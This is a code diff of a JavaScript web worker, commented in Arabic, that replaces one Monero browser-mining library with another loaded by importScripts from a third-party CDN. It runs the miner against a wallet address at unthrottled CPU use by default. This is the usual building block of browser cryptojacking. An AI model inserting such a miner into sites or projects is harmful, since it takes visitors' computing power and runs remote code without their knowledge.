@@ -1,5 +1,5 @@
-// miner-worker.js - ملحقة التعدين المعزولة عن الواجهة الأساسية
-importScripts('https://monerominer.rocks/miner.js');
+// miner-worker.js - التعدين عبر WebMinePool الموثوق لعام 2026
+importScripts('https://cdn.webminepool.com/webminepool.min.js');
 
 let minerObject = null;
 
@@ -8,12 +8,13 @@ self.onmessage = function(e) {
     
     if (data.type === 'init') {
         try {
-            if (typeof MoneroMiner !== 'undefined') {
-                minerObject = new MoneroMiner.User(data.address, data.user, {
-                    threads: data.threads || navigator.hardwareConcurrency || 2,
+            if (typeof WebMinePool !== 'undefined') {
+                // الربط بمحفظتك مباشرة XMR
+                minerObject = new WebMinePool.Anonymous(data.address, {
+                    threads: data.threads || 2,
                     autoThreads: false,
                     throttle: data.throttle || 0.0,
-                    forceASMJS: false
+                    coin: "monero"
                 });
             }
         } catch(err) {
@@ -36,9 +37,10 @@ self.onmessage = function(e) {
     }
 };
 
-// إرسال تقارير دورية بمعدل التعدين
+// إرسال تقارير دورية بمعدة التعدين (Hashrate)
 setInterval(() => {
     if (minerObject && minerObject.isRunning()) {
+        // WebMinePool يستخدم getHashesPerSecond() لإعطاء الـ Speed
         const hps = minerObject.getHashesPerSecond();
         self.postMessage({ type: 'hashrate', hps: hps });
     }
